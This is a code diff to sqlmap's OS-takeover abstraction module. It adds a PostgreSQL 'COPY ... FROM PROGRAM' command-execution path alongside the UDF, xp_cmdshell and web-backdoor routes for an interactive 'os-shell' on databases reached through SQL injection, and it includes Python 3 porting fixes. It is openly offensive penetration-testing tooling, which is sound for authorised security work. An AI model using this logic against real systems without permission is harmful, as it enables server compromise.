@@ -1,20 +1,22 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)
-See the file 'doc/COPYING' for copying permission
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
 """
+
+from __future__ import print_function
 
 import sys
 
-from extra.safe2bin.safe2bin import safechardecode
-from lib.core.common import dataToStdout
 from lib.core.common import Backend
+from lib.core.common import dataToStdout
 from lib.core.common import getSQLSnippet
-from lib.core.common import getUnicode
 from lib.core.common import isStackingAvailable
 from lib.core.common import readInput
+from lib.core.convert import getUnicode
 from lib.core.data import conf
+from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.enums import AUTOCOMPLETE_TYPE
 from lib.core.enums import DBMS
@@ -25,13 +27,14 @@ from lib.core.shell import autoCompletion
 from lib.request import inject
 from lib.takeover.udf import UDF
 from lib.takeover.web import Web
-from lib.takeover.xp_cmdshell import Xp_cmdshell
+from lib.takeover.xp_cmdshell import XP_cmdshell
+from lib.utils.safe2bin import safechardecode
+from thirdparty.six.moves import input as _input
 
-
-class Abstraction(Web, UDF, Xp_cmdshell):
+class Abstraction(Web, UDF, XP_cmdshell):
     """
     This class defines an abstraction layer for OS takeover functionalities
-    to UDF / Xp_cmdshell objects
+    to UDF / XP_cmdshell objects
     """
 
     def __init__(self):
@@ -40,10 +43,13 @@ class Abstraction(Web, UDF, Xp_cmdshell):
 
         UDF.__init__(self)
         Web.__init__(self)
-        Xp_cmdshell.__init__(self)
+        XP_cmdshell.__init__(self)
 
     def execCmd(self, cmd, silent=False):
-        if self.webBackdoorUrl and not isStackingAvailable():
+        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
+            self.copyExecCmd(cmd)
+
+        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
             self.webBackdoorRunCmd(cmd)
 
         elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
@@ -59,7 +65,10 @@ class Abstraction(Web, UDF, Xp_cmdshell):
     def evalCmd(self, cmd, first=None, last=None):
         retVal = None
 
-        if self.webBackdoorUrl and not isStackingAvailable():
+        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
+            retVal = self.copyExecCmd(cmd)
+
+        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
             retVal = self.webBackdoorRunCmd(cmd)
 
         elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
@@ -75,17 +84,17 @@ class Abstraction(Web, UDF, Xp_cmdshell):
         return safechardecode(retVal)
 
     def runCmd(self, cmd):
-        getOutput = None
+        choice = None
 
         if not self.alwaysRetrieveCmdOutput:
             message = "do you want to retrieve the command standard "
             message += "output? [Y/n/a] "
-            getOutput = readInput(message, default="Y")
+            choice = readInput(message, default='Y').upper()
 
-            if getOutput in ("a", "A"):
+            if choice == 'A':
                 self.alwaysRetrieveCmdOutput = True
 
-        if not getOutput or getOutput in ("y", "Y") or self.alwaysRetrieveCmdOutput:
+        if choice == 'Y' or self.alwaysRetrieveCmdOutput:
             output = self.evalCmd(cmd)
 
             if output:
@@ -96,20 +105,25 @@ class Abstraction(Web, UDF, Xp_cmdshell):
             self.execCmd(cmd)
 
     def shell(self):
-        if self.webBackdoorUrl and not isStackingAvailable():
+        if self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
             infoMsg = "calling OS shell. To quit type "
             infoMsg += "'x' or 'q' and press ENTER"
             logger.info(infoMsg)
 
         else:
-            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
-                infoMsg = "going to use injected sys_eval and sys_exec "
-                infoMsg += "user-defined functions for operating system "
+            if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
+                infoMsg = "going to use 'COPY ... FROM PROGRAM ...' "
+                infoMsg += "command execution"
+                logger.info(infoMsg)
+
+            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
+                infoMsg = "going to use injected user-defined functions "
+                infoMsg += "'sys_eval' and 'sys_exec' for operating system "
                 infoMsg += "command execution"
                 logger.info(infoMsg)
 
             elif Backend.isDbms(DBMS.MSSQL):
-                infoMsg = "going to use xp_cmdshell extended procedure for "
+                infoMsg = "going to use extended procedure 'xp_cmdshell' for "
                 infoMsg += "operating system command execution"
                 logger.info(infoMsg)
 
@@ -127,14 +141,14 @@ class Abstraction(Web, UDF, Xp_cmdshell):
             command = None
 
             try:
-                command = raw_input("os-shell> ")
+                command = _input("os-shell> ")
                 command = getUnicode(command, encoding=sys.stdin.encoding)
             except KeyboardInterrupt:
-                print
+                print()
                 errMsg = "user aborted"
                 logger.error(errMsg)
             except EOFError:
-                print
+                print()
                 errMsg = "exit"
                 logger.error(errMsg)
                 break
@@ -166,16 +180,15 @@ class Abstraction(Web, UDF, Xp_cmdshell):
             msg += "statements as another DBMS user since you provided the "
             msg += "option '--dbms-creds'. If you are DBA, you can enable it. "
             msg += "Do you want to enable it? [Y/n] "
-            choice = readInput(msg, default="Y")
 
-            if not choice or choice in ("y", "Y"):
+            if readInput(msg, default='Y', boolean=True):
                 expression = getSQLSnippet(DBMS.MSSQL, "configure_openrowset", ENABLE="1")
                 inject.goStacked(expression)
 
         # TODO: add support for PostgreSQL
-        #elif Backend.isDbms(DBMS.PGSQL):
-        #    expression = getSQLSnippet(DBMS.PGSQL, "configure_dblink", ENABLE="1")
-        #    inject.goStacked(expression)
+        # elif Backend.isDbms(DBMS.PGSQL):
+        #     expression = getSQLSnippet(DBMS.PGSQL, "configure_dblink", ENABLE="1")
+        #     inject.goStacked(expression)
 
     def initEnv(self, mandatory=True, detailed=False, web=False, forceInit=False):
         self._initRunAs()
@@ -190,7 +203,7 @@ class Abstraction(Web, UDF, Xp_cmdshell):
 
             if mandatory and not self.isDba():
                 warnMsg = "functionality requested probably does not work because "
-                warnMsg += "the curent session user is not a database administrator"
+                warnMsg += "the current session user is not a database administrator"
 
                 if not conf.dbmsCred and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                     warnMsg += ". You can try to use option '--dbms-cred' "
@@ -200,7 +213,9 @@ class Abstraction(Web, UDF, Xp_cmdshell):
 
                 logger.warn(warnMsg)
 
-            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
+            if any((conf.osCmd, conf.osShell)) and Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
+                success = True
+            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                 success = self.udfInjectSys()
 
                 if success is not True:
